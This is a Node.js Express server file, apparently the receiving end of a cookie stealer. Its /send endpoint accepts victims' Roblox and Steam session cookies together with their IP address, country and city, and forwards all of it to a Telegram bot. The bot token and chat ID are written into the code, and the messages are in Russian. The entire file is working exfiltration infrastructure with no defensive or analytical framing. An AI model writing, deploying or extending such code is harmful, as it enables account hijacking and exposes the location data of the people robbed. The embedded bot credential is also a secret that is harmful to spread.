const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TOKEN = "8679009953:AAE6I66uPMllDNCAdIL2vTUD7fs_Hvoo7uc";
const CHAT_ID = "6145369088";
const API = "https://api.telegram.org/bot" + TOKEN;

app.post('/send', async (req, res) => {
    try {
        const { robloxCookie, steamCookie, ip, country, city } = req.body;

        let msg = "👋 ЗАПУЩЕН\n\n";
        if (ip) {
            msg += "IP: " + ip + "\n";
            msg += "Страна: " + (country || "Н/Д") + "\n";
            msg += "Город: " + (city || "Н/Д");
        }

        await axios.post(API + "/sendMessage", {
            chat_id: CHAT_ID,
            text: msg
        });

        if (robloxCookie) {
            try {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('document', robloxCookie, { filename: 'roblox.txt', contentType: 'text/plain' });
                await axios.post(API + "/sendDocument", fd, {
                    headers: { 'Content-Type': 'multipart/form-data' }
                });
            } catch (e) {
                console.log('Ошибка отправки роблокс куки:', e.message);
            }
        }

        if (steamCookie) {
            try {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('document', steamCookie, { filename: 'steam.txt', contentType: 'text/plain' });
                await axios.post(API + "/sendDocument", fd, {
                    headers: { 'Content-Type': 'multipart/form-data' }
                });
            } catch (e) {
                console.log('Ошибка отправки стим куки:', e.message);
            }
        }

        res.json({ ok: true });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.listen(process.env.PORT || 3000);
